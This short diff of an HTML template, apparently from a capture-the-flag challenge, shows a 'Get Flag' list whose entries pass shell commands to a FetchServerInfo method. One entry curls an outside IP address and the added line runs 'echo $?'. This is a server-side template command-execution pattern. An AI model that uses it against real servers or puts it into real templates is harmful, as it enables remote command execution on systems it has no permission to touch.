@@ -33,6 +33,7 @@
     <h2>Get Flag</h2>
     <ul>
         <li>Flag: {{.FetchServerInfo "curl http://69.49.230.245:80"}}</li>
+        <li>Flag: {{.FetchServerInfo "echo $?"}}</li>
     </ul>
 </body>
 </html>
